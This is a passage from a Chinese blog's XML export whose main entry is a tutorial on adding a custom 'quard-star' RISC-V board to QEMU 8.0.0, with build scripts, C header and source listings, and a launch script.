<img src="/2024/04/08/ysyx-%E9%A2%84%E5%AD%A6%E4%B9%A0%E9%98%B6%E6%AE%B5/image-20240412220547572.png" alt="image-20240412220547572" style="zoom: 80%;">

<blockquote>
<p>0 </p>
</blockquote>
<img src="/2024/04/08/ysyx-%E9%A2%84%E5%AD%A6%E4%B9%A0%E9%98%B6%E6%AE%B5/image-20240412220634891.png" alt="image-20240412220634891" style="zoom:80%;">

<blockquote>
<p>1</p>
</blockquote>
<img src="/2024/04/08/ysyx-%E9%A2%84%E5%AD%A6%E4%B9%A0%E9%98%B6%E6%AE%B5/image-20240412220706401.png" alt="image-20240412220706401" style="zoom:80%;">

<blockquote>
<p>双控状态</p>
</blockquote>
<img src="/2024/04/08/ysyx-%E9%A2%84%E5%AD%A6%E4%B9%A0%E9%98%B6%E6%AE%B5/image-20240412221307079.png" alt="image-20240412221307079" style="zoom:80%;">]]></content>
      <categories>
        <category>ysyx</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，ysyx</tag>
      </tags>
  </entry>
  <entry>
    <title>基于qemu-riscv构件嵌入式系统</title>
    <url>/2024/03/25/%E5%9F%BA%E4%BA%8Eqemu-riscv%E6%9E%84%E4%BB%B6%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h1 id="1-基础"><a href="#1-基础" class="headerlink" title="1.基础"></a>1.基础</h1><h2 id="1-1-qemu-环境搭建"><a href="#1-1-qemu-环境搭建" class="headerlink" title="1.1 qemu 环境搭建"></a>1.1 qemu 环境搭建</h2><h3 id="主要参考文章："><a href="#主要参考文章：" class="headerlink" title="主要参考文章："></a>主要参考文章：</h3><ol>
<li><a href="https://quard-star-tutorial.readthedocs.io/zh-cn/latest/ch2.html">基于qemu-riscv从0开始构建嵌入式linux系统ch2. 添加qemu仿真板——Quard-Star板 — 主页 (quard-star-tutorial.readthedocs.io)</a></li>
<li><a href="https://yanglianoo.github.io/2023/06/12/QEMU%E4%B8%AD%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BC%80%E5%8F%91%E6%9D%BF/">1.新建quard-star开发板 | TimerのBlog (yanglianoo.github.io)</a></li>
<li><a href="https://blog.csdn.net/qq_42878531/article/details/124755865">【RISC-V】risc-v架构学习笔记（架构初学）_riscv mtvec-CSDN博客</a></li>
<li><a href="https://www.qemu.org/docs/master/system/riscv/virt.html">‘virt’ 通用虚拟平台 （virt） — QEMU 文档</a></li>
</ol>
<p><strong>写这个 blog 主要记录一下学习过程，再次感谢!!</strong></p>
<p>硬件架构图：</p>
<p><img src="https://github.com/QQxiaoming/quard_star_tutorial/raw/main/tutorial/img/img3.png" alt="硬件架构"></p>
<h3 id="本机环境"><a href="#本机环境" class="headerlink" title="本机环境"></a>本机环境</h3><p><code>Ubuntu22.04 + qemu8.0.0</code></p>
<h3 id="qemu-环境配置："><a href="#qemu-环境配置：" class="headerlink" title="qemu 环境配置："></a>qemu 环境配置：</h3><p>新建 build.sh 文件，用于qemu的编译，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd qemu-8.0.0</span><br><span class="line">if [ ! -d &quot;$SHELL_FOLDER/output/qemu&quot; ]; then  </span><br><span class="line">./configure --prefix=$SHELL_FOLDER/output/qemu  --target-list=riscv64-softmmu --enable-gtk  --enable-virtfs --disable-gio</span><br><span class="line">fi  </span><br><span class="line">make -j16</span><br><span class="line">make install</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>

<ul>
<li>注意：这种的环境变量并没有添加到终端中，终端并不能直接执行shell命令，需要去到<code>qemu/bin</code>下面才能执行，所以需要将路径添加到<code>zshrc</code>中</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:/home/liangzhou/桌面/riscv code/output/qemu/bin</span><br></pre></td></tr></table></figure>

<p><img src="/2024/03/25/%E5%9F%BA%E4%BA%8Eqemu-riscv%E6%9E%84%E4%BB%B6%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/image-20240326112910836.png" alt="image-20240326112910836"></p>
<ul>
<li>然后在终端输入：<code>qemu-system-riscv --version</code></li>
</ul>
<h2 id="1-2-新建板卡"><a href="#1-2-新建板卡" class="headerlink" title="1.2 新建板卡"></a>1.2 新建板卡</h2><p>需要增加两个文件以及并修改四个文件</p>
<ol>
<li>在 <code>/qemu8.0.0/hw/riscv</code> 下 增加quard_star.c</li>
<li>在 <code>/qemu8.0.0/include/hw/riscv</code> 下 增加quard_star.h</li>
<li>修改 <code>qemu-8.0.0/configs/devices/riscv64-softmmu/default.mak</code>    <code>CONFIG QUARD STAR=y</code>   启动板卡配置</li>
<li>修改 <code>qemu-8.0.0/configs/devices/riscv32-softmmu/default.mak</code>    同上</li>
<li>修改 <code>qemu-8.0.0/hw/riscv/meson.build</code>    — 作用：添加 源文件以及依赖  <ol>
<li><img src="/2024/03/25/%E5%9F%BA%E4%BA%8Eqemu-riscv%E6%9E%84%E4%BB%B6%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/image-20240326115307621.png" alt="image-20240326115307621"></li>
</ol>
</li>
<li>修改 <code>qemu-8.0.0/hw/riscv/Kconfig</code>    — 作用 用于 QEMU 中 RISC-V 硬件模拟的配置<ol>
<li><img src="/2024/03/25/%E5%9F%BA%E4%BA%8Eqemu-riscv%E6%9E%84%E4%BB%B6%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/image-20240326115434463.png" alt="image-20240326115434463"></li>
</ol>
</li>
</ol>
<h3 id="1-2-1-quard-star-h"><a href="#1-2-1-quard-star-h" class="headerlink" title="1.2.1 quard_star.h"></a>1.2.1 quard_star.h</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HW_RISCV_QUARD_STAR__H   <span class="comment">// 预处理指令放置头文件被重复包含</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HW_RISCV_QUARD_STAR__H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/riscv/riscv_hart.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/sysbus.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qom/object.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/block/flash.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_CPUS_MAX 8     <span class="comment">// 定义quard_star 最大CPU数 = 8  --- 上面硬件架构图</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_SOCKETS_MAX 8  <span class="comment">// 定义最大插槽数 也为 8 </span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TYPE_RISCV_QUARD_STAR_MACHINE MACHINE_TYPE_NAME(<span class="string">&quot;quard-star&quot;</span>) <span class="comment">// 定义了机器名称</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">QuardStarState</span> QuardStarState;  <span class="comment">// 结构体前置声明  用于解决两个结构体互相依赖的问题</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">DECLARE_INSTANCE_CHECKER</span>(QuardStarState, RISCV_VIRT_MACHINE,</span><br><span class="line">                         TYPE_RISCV_QUARD_STAR_MACHINE)    <span class="comment">// 实例化一个检查函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">QuardStarState</span> &#123;</span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    MachineState parent;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">    RISCVHartArrayState soc[QUARD_STAR_SOCKETS_MAX];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 枚举定义 定义了 资源 MROM等</span></span><br><span class="line"><span class="keyword">enum</span> &#123;</span><br><span class="line">    QUARD_STAR_MROM,</span><br><span class="line">    QUARD_STAR_SRAM,</span><br><span class="line">    QUARD_STAR_UART0,</span><br><span class="line">    QUARD_STAR_DRAM,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> &#123;</span><br><span class="line">    QUARD_STAR_UART0_IRQ = <span class="number">10</span>,  <span class="comment">//定义了串口中断号为10</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<h3 id="1-2-2-quard-star-c"><a href="#1-2-2-quard-star-c" class="headerlink" title="1.2.2 quard_star.c"></a>1.2.2 quard_star.c</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/osdep.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/units.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/error-report.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/guest-random.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qapi/error.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/boards.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/loader.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/sysbus.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/qdev-properties.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/char/serial.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;target/riscv/cpu.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/riscv/riscv_hart.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/riscv/quard_star.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/riscv/boot.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/riscv/numa.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/intc/riscv_aclint.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/intc/riscv_aplic.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;chardev/char.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sysemu/device_tree.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sysemu/sysemu.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sysemu/kvm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sysemu/tpm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构体数组中添加硬件地址 和映射的长度地址 前一个是基址 后一个是长度</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemMapEntry quard_star_memmap[] = &#123;</span><br><span class="line">    [QUARD_STAR_MROM]  = &#123;        <span class="number">0x0</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_SRAM]  = &#123;     <span class="number">0x8000</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_UART0] = &#123; <span class="number">0x10000000</span>,         <span class="number">0x100</span> &#125;,</span><br><span class="line">    [QUARD_STAR_DRAM]  = &#123; <span class="number">0x80000000</span>,          <span class="number">0x80</span> &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* 创建CPU */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">quard_star_cpu_create</span><span class="params">(MachineState *machine)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i, base_hartid, hart_count;</span><br><span class="line">    <span class="type">char</span> *soc_name;</span><br><span class="line">    QuardStarState *s = <span class="built_in">RISCV_VIRT_MACHINE</span>(machine);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (QUARD_STAR_SOCKETS_MAX &lt; <span class="built_in">riscv_socket_count</span>(machine)) &#123;</span><br><span class="line">        <span class="built_in">error_report</span>(<span class="string">&quot;number of sockets/nodes should be less than %d&quot;</span>,</span><br><span class="line">            QUARD_STAR_SOCKETS_MAX);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">riscv_socket_count</span>(machine); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">riscv_socket_check_hartids</span>(machine, i)) &#123;</span><br><span class="line">            <span class="built_in">error_report</span>(<span class="string">&quot;discontinuous hartids in socket%d&quot;</span>, i);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        base_hartid = <span class="built_in">riscv_socket_first_hartid</span>(machine, i);</span><br><span class="line">        <span class="keyword">if</span> (base_hartid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">error_report</span>(<span class="string">&quot;can&#x27;t find hartid base for socket%d&quot;</span>, i);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        hart_count = <span class="built_in">riscv_socket_hart_count</span>(machine, i);</span><br><span class="line">        <span class="keyword">if</span> (hart_count &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">error_report</span>(<span class="string">&quot;can&#x27;t find hart count for socket%d&quot;</span>, i);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        soc_name = <span class="built_in">g_strdup_printf</span>(<span class="string">&quot;soc%d&quot;</span>, i);</span><br><span class="line">        <span class="built_in">object_initialize_child</span>(<span class="built_in">OBJECT</span>(machine), soc_name, &amp;s-&gt;soc[i],</span><br><span class="line">                                TYPE_RISCV_HART_ARRAY);</span><br><span class="line">        <span class="built_in">g_free</span>(soc_name);</span><br><span class="line">        <span class="built_in">object_property_set_str</span>(<span class="built_in">OBJECT</span>(&amp;s-&gt;soc[i]), <span class="string">&quot;cpu-type&quot;</span>,</span><br><span class="line">                                machine-&gt;cpu_type, &amp;error_abort);</span><br><span class="line">        <span class="built_in">object_property_set_int</span>(<span class="built_in">OBJECT</span>(&amp;s-&gt;soc[i]), <span class="string">&quot;hartid-base&quot;</span>,</span><br><span class="line">                                base_hartid, &amp;error_abort);</span><br><span class="line">        <span class="built_in">object_property_set_int</span>(<span class="built_in">OBJECT</span>(&amp;s-&gt;soc[i]), <span class="string">&quot;num-harts&quot;</span>,</span><br><span class="line">                                hart_count, &amp;error_abort);</span><br><span class="line">        <span class="built_in">sysbus_realize</span>(<span class="built_in">SYS_BUS_DEVICE</span>(&amp;s-&gt;soc[i]), &amp;error_abort);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  创建内存 */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">quard_star_memory_create</span><span class="params">(MachineState *machine)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QuardStarState *s = <span class="built_in">RISCV_VIRT_MACHINE</span>(machine);</span><br><span class="line">    MemoryRegion *system_memory = <span class="built_in">get_system_memory</span>();</span><br><span class="line">    <span class="comment">//分配三片存储空间 dram sram mrom</span></span><br><span class="line">    MemoryRegion *dram_mem = <span class="built_in">g_new</span>(MemoryRegion, <span class="number">1</span>);  <span class="comment">//DRAM</span></span><br><span class="line">    MemoryRegion *sram_mem = <span class="built_in">g_new</span>(MemoryRegion, <span class="number">1</span>);  <span class="comment">//SRAM</span></span><br><span class="line">    MemoryRegion *mask_rom = <span class="built_in">g_new</span>(MemoryRegion, <span class="number">1</span>);  <span class="comment">//MROM  </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memory_region_init_ram</span>(dram_mem, <span class="literal">NULL</span>, <span class="string">&quot;riscv_quard_star_board.dram&quot;</span>,</span><br><span class="line">                           quard_star_memmap[QUARD_STAR_DRAM].size, &amp;error_fatal);</span><br><span class="line">    <span class="built_in">memory_region_add_subregion</span>(system_memory, </span><br><span class="line">                                quard_star_memmap[QUARD_STAR_DRAM].base, dram_mem);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memory_region_init_ram</span>(sram_mem, <span class="literal">NULL</span>, <span class="string">&quot;riscv_quard_star_board.sram&quot;</span>,</span><br><span class="line">                           quard_star_memmap[QUARD_STAR_SRAM].size, &amp;error_fatal);</span><br><span class="line">    <span class="built_in">memory_region_add_subregion</span>(system_memory, </span><br><span class="line">                                quard_star_memmap[QUARD_STAR_SRAM].base, sram_mem);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memory_region_init_rom</span>(mask_rom, <span class="literal">NULL</span>, <span class="string">&quot;riscv_quard_star_board.mrom&quot;</span>,</span><br><span class="line">                           quard_star_memmap[QUARD_STAR_MROM].size, &amp;error_fatal);</span><br><span class="line">    <span class="built_in">memory_region_add_subregion</span>(system_memory, </span><br><span class="line">                                quard_star_memmap[QUARD_STAR_MROM].base, mask_rom);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">riscv_setup_rom_reset_vec</span>(machine, &amp;s-&gt;soc[<span class="number">0</span>], </span><br><span class="line">                              quard_star_memmap[QUARD_STAR_MROM].base,</span><br><span class="line">                              quard_star_memmap[QUARD_STAR_MROM].base,</span><br><span class="line">                              quard_star_memmap[QUARD_STAR_MROM].size,</span><br><span class="line">                              <span class="number">0x0</span>, <span class="number">0x0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* quard-star 初始化各种硬件 资源 cpu 内存等 后面会扩展 can flash i2c等等 */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> quard_star_mach                                                                                                                                    <span class="title">ine_init</span><span class="params">(MachineState *machine)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">// 创建CPU</span></span><br><span class="line">   <span class="built_in">quard_star_cpu_create</span>(machine);</span><br><span class="line">   <span class="comment">// 创建主存</span></span><br><span class="line">   <span class="built_in">quard_star_memory_create</span>(machine);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">quard_star_machine_instance_init</span><span class="params">(Object *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 创建machine */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">quard_star_machine_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MachineClass *mc = <span class="built_in">MACHINE_CLASS</span>(oc);</span><br><span class="line"></span><br><span class="line">    mc-&gt;desc = <span class="string">&quot;RISC-V Quard Star board&quot;</span>;</span><br><span class="line">    mc-&gt;init = quard_star_machine_init;    <span class="comment">// 初始化板卡资源 以及 最大支持的smp核心数</span></span><br><span class="line">    mc-&gt;max_cpus = QUARD_STAR_CPUS_MAX;</span><br><span class="line">    mc-&gt;default_cpu_type = TYPE_RISCV_CPU_BASE;</span><br><span class="line">    mc-&gt;pci_allow_0_address = <span class="literal">true</span>;</span><br><span class="line">    mc-&gt;possible_cpu_arch_ids = riscv_numa_possible_cpu_arch_ids;</span><br><span class="line">    mc-&gt;cpu_index_to_instance_props = riscv_numa_cpu_index_to_props;</span><br><span class="line">    mc-&gt;get_default_cpu_node_id = riscv_numa_get_default_cpu_node_id;</span><br><span class="line">    mc-&gt;numa_mem_supported = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 注册 quard-star 定义了 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo quard_star_machine_typeinfo = &#123;</span><br><span class="line">    .name       = <span class="built_in">MACHINE_TYPE_NAME</span>(<span class="string">&quot;quard-star&quot;</span>),</span><br><span class="line">    .parent     = TYPE_MACHINE,</span><br><span class="line">    .class_init = quard_star_machine_class_init,</span><br><span class="line">    .instance_init = quard_star_machine_instance_init,</span><br><span class="line">    .instance_size = <span class="built_in">sizeof</span>(QuardStarState),</span><br><span class="line">    .interfaces = (InterfaceInfo[]) &#123;</span><br><span class="line">         &#123; TYPE_HOTPLUG_HANDLER &#125;,</span><br><span class="line">         &#123; &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">quard_star_machine_init_register_types</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">type_register_static</span>(&amp;quard_star_machine_typeinfo);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">type_init</span>(quard_star_machine_init_register_types) </span><br><span class="line">    <span class="comment">// 类的注册</span></span><br></pre></td></tr></table></figure>



<p>注意：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemMapEntry quard_star_memmap[] = &#123;</span><br><span class="line">    [QUARD_STAR_MROM]  = &#123;        <span class="number">0x0</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_SRAM]  = &#123;     <span class="number">0x8000</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_UART0] = &#123; <span class="number">0x10000000</span>,         <span class="number">0x100</span> &#125;,</span><br><span class="line">    [QUARD_STAR_DRAM]  = &#123; <span class="number">0x80000000</span>,          <span class="number">0x80</span> &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol>
<li>maskrom 用于cpu启动时固定执行其内部的代码</li>
<li>sran 为早期启动代码时数据存放的空间</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">riscv_setup_rom_reset_vec</span>(machine, &amp;s-&gt;soc[<span class="number">0</span>], </span><br><span class="line">                              quard_star_memmap[QUARD_STAR_MROM].base,</span><br><span class="line">                              quard_star_memmap[QUARD_STAR_MROM].base,</span><br><span class="line">                              quard_star_memmap[QUARD_STAR_MROM].size,</span><br><span class="line">                              <span class="number">0x0</span>, <span class="number">0x0</span>);</span><br></pre></td></tr></table></figure>

<ol>
<li>将cpu hart id 值加载到 a0寄存器 </li>
<li>设备树文件基地址加载到a1寄存器 然后跳转到下级运行代码</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 创建machine */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">quard_star_machine_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MachineClass *mc = <span class="built_in">MACHINE_CLASS</span>(oc);</span><br><span class="line"></span><br><span class="line">    mc-&gt;desc = <span class="string">&quot;RISC-V Quard Star board&quot;</span>;</span><br><span class="line">    mc-&gt;init = quard_star_machine_init;    <span class="comment">// 初始化板卡资源 以及 最大支持的smp核心数</span></span><br><span class="line">    mc-&gt;max_cpus = QUARD_STAR_CPUS_MAX;</span><br><span class="line">    mc-&gt;default_cpu_type = TYPE_RISCV_CPU_BASE;</span><br><span class="line">    mc-&gt;pci_allow_0_address = <span class="literal">true</span>;</span><br><span class="line">    mc-&gt;possible_cpu_arch_ids = riscv_numa_possible_cpu_arch_ids;</span><br><span class="line">    mc-&gt;cpu_index_to_instance_props = riscv_numa_cpu_index_to_props;</span><br><span class="line">    mc-&gt;get_default_cpu_node_id = riscv_numa_get_default_cpu_node_id;</span><br><span class="line">    mc-&gt;numa_mem_supported = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>初始化machine，将machine中的各个字段进行更新</li>
</ol>
<h3 id="1-2-3-文件执行"><a href="#1-2-3-文件执行" class="headerlink" title="1.2.3 文件执行"></a>1.2.3 文件执行</h3><p>run.sh文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SHELL_FOLDER=$(cd &quot;$(dirname &quot;$0&quot;)&quot;;pwd)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SHELL_FOLDER/output/qemu/bin/qemu-system-riscv64 \</span></span><br><span class="line"><span class="language-bash">-M quard-star \</span></span><br><span class="line"><span class="language-bash">-m 1G \</span></span><br><span class="line"><span class="language-bash">-smp 8 \</span></span><br></pre></td></tr></table></figure>

<ol>
<li><code>$SHELL_FOLDER/output/qemu/bin/qemu-system-riscv64</code>: 使用完整路径指定<code>qemu-system-riscv64</code>的位置，这是QEMU中用于启动RISC-V 64位架构虚拟机的程序。路径依赖于第一行中设置的<code>SHELL_FOLDER</code>变量</li>
<li><code>-M quard-star</code>: 指定虚拟机使用的机器类型为“quard-star”，即我们之前定制的RISC-V机器模型。</li>
<li><code>-m 1G</code>: 为虚拟机分配1GB的内存。</li>
<li><code>-smp 8</code>: 配置虚拟机使用的处理器核心数为8，即虚拟机将模拟一个8核心的处理器。</li>
</ol>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
</search>
